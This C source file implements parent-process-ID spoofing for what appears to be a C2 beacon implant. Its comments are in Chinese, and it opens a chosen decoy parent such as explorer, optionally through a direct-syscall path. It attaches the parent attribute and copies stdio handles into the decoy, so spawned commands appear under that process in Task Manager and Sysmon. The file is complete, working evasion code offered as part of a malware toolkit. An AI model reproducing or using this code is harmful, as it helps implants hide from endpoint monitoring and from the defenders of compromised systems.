#include "beacon_spawn.h"

/*
 * spawn.c -- 统一进程创建实现（PPID 欺骗）。
 *
 * 流程移植自参考项目 D:\code\Vs2022\PPID-Spoofing\ppid_spoof.c：
 *   OpenProcess(PROCESS_CREATE_PROCESS|PROCESS_QUERY_LIMITED_INFORMATION)
 *   -> 两段式 InitializeProcThreadAttributeList -> UpdateProcThreadAttribute
 *   -> CreateProcessW(EXTENDED_STARTUPINFO_PRESENT) -> DeleteProcThreadAttributeList
 *
 * 本项目改造点：
 *  - 全部走 Win32Api 表槽位（pfnNtOpenProcess 跟随全局 syscall 开关）；
 *  - PARENT_PROCESS 时 STARTF_USESTDHANDLES 的句柄 DuplicateHandle 进假父，
 *    siEx.hStd* 填父进程句柄值；创建后立刻关掉假父里的拷贝；
 *  - spoof 失败可回退普通创建（fallback_plain），回退仍用调用方原始 si；
 *  - Debug 构建下创建后查询子进程报告的 PPID 并打印 SPOOFED/NOT APPLIED。
 */

#ifndef PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
#define PROC_THREAD_ATTRIBUTE_PARENT_PROCESS 0x00020000
#endif

/* 全局欺骗目标（spawn_ppid 命令读写）；0 = 不欺骗 */
static UINT32 g_spawn_ppid = 0;

UINT32 SpawnGetPpid(VOID)
{
    return g_spawn_ppid;
}

VOID SpawnSetPpid(UINT32 ppid)
{
    g_spawn_ppid = ppid;
}

/* 按进程名查 PID（Toolhelp 快照，走 api 表槽位）；找不到返回 0。 */
static UINT32 SpawnFindPidByName(const Win32Api* api, const WCHAR* name)
{
    HANDLE snap;
    PROCESSENTRY32W pe;
    UINT32 pid = 0;

    if (!api || !api->pfnCreateToolhelp32Snapshot || !name || !name[0]) {
        return 0;
    }
    snap = api->pfnCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        return 0;
    }

    ZeroMemory(&pe, sizeof(pe));
    pe.dwSize = sizeof(pe);
    if (api->pfnProcess32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, name) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (api->pfnProcess32NextW(snap, &pe));
    }
    api->pfnCloseHandle(snap);
    return pid;
}

/* 应用 profile 的欺骗目标配置：进程名或数字 PID；空 = 不欺骗。 */
UINT32 SpawnApplyProfile(const Win32Api* api, const CHAR* spec)
{
    UINT32 pid = 0;
    const CHAR* p;
    BOOL numeric = TRUE;

    if (spec && spec[0]) {
        /* 全数字 = PID */
        for (p = spec; *p; ++p) {
            if (*p < '0' || *p > '9') {
                numeric = FALSE;
                break;
            }
        }
        if (numeric) {
            pid = (UINT32)strtoul(spec, NULL, 10);
        } else {
            WCHAR* wide = Utf8ToWide(spec);
            if (wide) {
                pid = SpawnFindPidByName(api, wide);
                HeapFree(GetProcessHeap(), 0, wide);
            }
        }
    }

    SpawnSetPpid(pid);
    DebugPrintf("[spawn] profile spawn_ppid=%s -> pid %lu%s\n",
                spec && spec[0] ? spec : "(none)", (ULONG)pid,
                pid ? "" : " (spoofing disabled)");
    return pid;
}

/* 验证子进程"看到"的父 PID（NtQueryInformationProcess 返回
 * InheritedFromUniqueProcessId，与 TaskManager/Sysmon 用户态视角一致）。 */
typedef struct SpawnProcessBasicInformation {
    PVOID Reserved1;
    PVOID PebBaseAddress;
    PVOID Reserved2[2];
    ULONG_PTR UniqueProcessId;
    ULONG_PTR InheritedFromUniqueProcessId;
} SpawnProcessBasicInformation;

static VOID SpawnVerifyPpid(const Win32Api* api, HANDLE process, UINT32 expected_ppid)
{
    SpawnProcessBasicInformation pbi;
    NTSTATUS st;

    if (!api || !api->pfnNtQueryInformationProcess) return;

    ZeroMemory(&pbi, sizeof(pbi));
    st = api->pfnNtQueryInformationProcess(process, 0 /* ProcessBasicInformation */,
                                           &pbi, sizeof(pbi), NULL);
    if (NT_SUCCESS(st)) {
        DebugPrintf("[spawn] child pid=%llu reported ppid=%llu target=%lu => %s\n",
                    (unsigned long long)pbi.UniqueProcessId,
                    (unsigned long long)pbi.InheritedFromUniqueProcessId,
                    (ULONG)expected_ppid,
                    pbi.InheritedFromUniqueProcessId == (ULONG_PTR)expected_ppid
                        ? "SPOOFED" : "NOT APPLIED");
    } else {
        DebugPrintf("[spawn] ppid verify failed: 0x%08lX\n", (ULONG)st);
    }
}

/* spoof 失败时的错误消息 */
static VOID SpawnSetError(CHAR* err, SIZE_T err_size, const CHAR* what, DWORD gle)
{
    if (err && err_size) {
        _snprintf_s(err, err_size, _TRUNCATE, "%s failed: %lu", what, (ULONG)gle);
    }
}

static BOOL SpawnHandleLooksReal(HANDLE h)
{
    return h != NULL && h != INVALID_HANDLE_VALUE;
}

/* 关掉假父进程里的那份句柄拷贝（DUPLICATE_CLOSE_SOURCE），避免管道写端残留。 */
static VOID SpawnCloseRemoteHandle(const Win32Api* api, HANDLE hParent, HANDLE hRemote)
{
    HANDLE local = NULL;
    HANDLE self;

    if (!api || !hParent || !hRemote || !api->pfnDuplicateHandle) return;
    self = api->pfnGetCurrentProcess ? api->pfnGetCurrentProcess() : GetCurrentProcess();
    if (api->pfnDuplicateHandle(hParent, hRemote, self, &local,
                                0, FALSE, DUPLICATE_CLOSE_SOURCE) && local) {
        CloseHandle(local);
    }
}

static VOID SpawnCloseRemoteStd(const Win32Api* api, HANDLE hParent, HANDLE parent_dups[3])
{
    INT i;
    if (!parent_dups) return;
    for (i = 0; i < 3; i++) {
        if (parent_dups[i]) {
            SpawnCloseRemoteHandle(api, hParent, parent_dups[i]);
            parent_dups[i] = NULL;
        }
    }
}

/* PARENT_PROCESS 时内核按假父句柄表解释 STARTF_USESTDHANDLES。
 * 把调用方 stdin/stdout/stderr DuplicateHandle 进假父（可继承），siOut 填父进程句柄值。
 * stdout==stderr 时各 dup 一份，父进程里两个不同值。 */
static BOOL SpawnDupStdIntoParent(const Win32Api* api, HANDLE hParent,
                                  const STARTUPINFOW* si, STARTUPINFOW* siOut,
                                  HANDLE parent_dups[3])
{
    HANDLE self;
    HANDLE src[3];
    INT i;

    parent_dups[0] = parent_dups[1] = parent_dups[2] = NULL;
    *siOut = *si;
    if (!(si->dwFlags & STARTF_USESTDHANDLES)) return TRUE;
    if (!api->pfnDuplicateHandle) return FALSE;

    self = api->pfnGetCurrentProcess ? api->pfnGetCurrentProcess() : GetCurrentProcess();
    src[0] = si->hStdInput;
    src[1] = si->hStdOutput;
    src[2] = si->hStdError;

    for (i = 0; i < 3; i++) {
        if (!SpawnHandleLooksReal(src[i])) continue;
        if (!api->pfnDuplicateHandle(self, src[i], hParent, &parent_dups[i],
                                     0, TRUE, DUPLICATE_SAME_ACCESS)) {
            SpawnCloseRemoteStd(api, hParent, parent_dups);
            return FALSE;
        }
    }
    if (SpawnHandleLooksReal(src[0])) siOut->hStdInput = parent_dups[0];
    if (SpawnHandleLooksReal(src[1])) siOut->hStdOutput = parent_dups[1];
    if (SpawnHandleLooksReal(src[2])) siOut->hStdError = parent_dups[2];
    return TRUE;
}

static BOOL SpawnNeedsStdDup(const STARTUPINFOW* si)
{
    if (!si || !(si->dwFlags & STARTF_USESTDHANDLES)) return FALSE;
    return SpawnHandleLooksReal(si->hStdInput) ||
           SpawnHandleLooksReal(si->hStdOutput) ||
           SpawnHandleLooksReal(si->hStdError);
}

BOOL SpawnCreateProcess(const Win32Api* api,
                        const SpawnOptions* opt,
                        LPCWSTR app, LPWSTR cmdline,
                        LPSECURITY_ATTRIBUTES pa, LPSECURITY_ATTRIBUTES ta,
                        BOOL inherit, DWORD flags, LPVOID env, LPCWSTR cwd,
                        LPSTARTUPINFOW si, LPPROCESS_INFORMATION pi,
                        CHAR* err, SIZE_T err_size)
{
    BOOL spoof;
    BOOL fallback_plain;
    HANDLE hParent = NULL;
    HANDLE parent_dups[3];
    LPPROCESS_THREAD_ATTRIBUTE_LIST lpAttrList = NULL;
    SIZE_T cbAttrList = 0;
    ACCESS_MASK parent_access;
    BOOL ok = FALSE;

    parent_dups[0] = parent_dups[1] = parent_dups[2] = NULL;

    if (err && err_size) err[0] = '\0';
    if (!api || !pi) return FALSE;

    spoof = opt != NULL && opt->ppid != 0;
    fallback_plain = opt == NULL || opt->fallback_plain;

    if (!spoof) {
        /* 直通：与普通 CreateProcessW 零差异 */
        if (!api->pfnCreateProcessW(app, cmdline, pa, ta, inherit,
                                    flags, env, cwd, si, pi)) {
            SpawnSetError(err, err_size, "CreateProcess", GetLastError());
            return FALSE;
        }
        return TRUE;
    }

    /* ---- PPID 欺骗路径 ---- */

    /* 1. 打开目标父进程句柄（PROCESS_CREATE_PROCESS 权限；走 pfnNtOpenProcess
     *    槽位，跟随全局 syscall 开关）。管道捕获还要 PROCESS_DUP_HANDLE，
     *    才能把调用方 stdio 句柄复制进假父。 */
    {
        OBJECT_ATTRIBUTES oa;
        CLIENT_ID cid;
        NTSTATUS st;

        ZeroMemory(&oa, sizeof(oa));
        oa.Length = sizeof(oa);
        cid.UniqueProcess = (HANDLE)(ULONG_PTR)opt->ppid;
        cid.UniqueThread = NULL;

        parent_access = PROCESS_CREATE_PROCESS | PROCESS_QUERY_LIMITED_INFORMATION;
        if (SpawnNeedsStdDup(si)) parent_access |= PROCESS_DUP_HANDLE;

        st = api->pfnNtOpenProcess(&hParent, parent_access, &oa, &cid);
        if (!NT_SUCCESS(st)) {
            hParent = NULL;
            if (fallback_plain) {
                DebugPrintf("[spawn] NtOpenProcess(%lu) failed (0x%08lX), falling back\n",
                            (ULONG)opt->ppid, (ULONG)st);
                if (api->pfnCreateProcessW(app, cmdline, pa, ta, inherit,
                                           flags, env, cwd, si, pi)) {
                    return TRUE;
                }
                SpawnSetError(err, err_size, "CreateProcess (fallback)", GetLastError());
                return FALSE;
            }
            SpawnSetError(err, err_size, "NtOpenProcess", (DWORD)st);
            return FALSE;
        }
    }

    /* 2. 两段式初始化 attribute list（先求大小，再分配并初始化）。 */
    if (api->pfnInitializeProcThreadAttributeList) {
        api->pfnInitializeProcThreadAttributeList(NULL, 1, 0, &cbAttrList);
    }
    if (cbAttrList == 0) {
        if (fallback_plain) goto fallback;
        SpawnSetError(err, err_size, "InitializeProcThreadAttributeList", GetLastError());
        goto cleanup;
    }
    lpAttrList = (LPPROCESS_THREAD_ATTRIBUTE_LIST)
        HeapAlloc(GetProcessHeap(), 0, cbAttrList);
    if (!lpAttrList ||
        !api->pfnInitializeProcThreadAttributeList(lpAttrList, 1, 0, &cbAttrList)) {
        if (fallback_plain) goto fallback;
        SpawnSetError(err, err_size, "InitializeProcThreadAttributeList", GetLastError());
        goto cleanup;
    }

    /* 3. 设置父进程属性（句柄值直接作为属性值）。 */
    if (!api->pfnUpdateProcThreadAttribute(
            lpAttrList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
            &hParent, sizeof(hParent), NULL, NULL)) {
        if (fallback_plain) goto fallback;
        SpawnSetError(err, err_size, "UpdateProcThreadAttribute", GetLastError());
        goto cleanup;
    }

    /* 4. 组装 STARTUPINFOEX：stdio 句柄复制进假父后再写入 siEx。 */
    {
        STARTUPINFOEXW siEx;

        ZeroMemory(&siEx, sizeof(siEx));
        if (si) {
            siEx.StartupInfo = *si;
        }
        if (SpawnNeedsStdDup(si)) {
            if (!SpawnDupStdIntoParent(api, hParent, si, &siEx.StartupInfo, parent_dups)) {
                if (fallback_plain) goto fallback;
                SpawnSetError(err, err_size, "DuplicateHandle", GetLastError());
                goto cleanup;
            }
        }
        siEx.StartupInfo.cb = sizeof(siEx);
        siEx.lpAttributeList = lpAttrList;

        ZeroMemory(pi, sizeof(*pi));
        ok = api->pfnCreateProcessW(app, cmdline, pa, ta, inherit,
                                    flags | EXTENDED_STARTUPINFO_PRESENT,
                                    env, cwd, &siEx.StartupInfo, pi);
        /* 子进程已继承假父句柄；立刻关掉 explorer 里的拷贝，否则管道不 EOF。 */
        SpawnCloseRemoteStd(api, hParent, parent_dups);
    }

    if (ok) {
        SpawnVerifyPpid(api, pi->hProcess, opt->ppid);
        goto cleanup;
    }
    if (fallback_plain) goto fallback;
    SpawnSetError(err, err_size, "CreateProcess (spoof)", GetLastError());
    goto cleanup;

fallback:
    SpawnCloseRemoteStd(api, hParent, parent_dups);
    DebugPrintf("[spawn] ppid spoof failed for pid %lu, falling back to plain create\n",
                (ULONG)opt->ppid);
    ZeroMemory(pi, sizeof(*pi));
    if (api->pfnCreateProcessW(app, cmdline, pa, ta, inherit,
                               flags, env, cwd, si, pi)) {
        ok = TRUE;
        goto cleanup;
    }
    SpawnSetError(err, err_size, "CreateProcess (fallback)", GetLastError());
    ok = FALSE;

cleanup:
    SpawnCloseRemoteStd(api, hParent, parent_dups);
    if (lpAttrList) {
        if (api->pfnDeleteProcThreadAttributeList) {
            api->pfnDeleteProcThreadAttributeList(lpAttrList);
        }
        HeapFree(GetProcessHeap(), 0, lpAttrList);
    }
    if (hParent) CloseHandle(hParent);
    return ok;
}
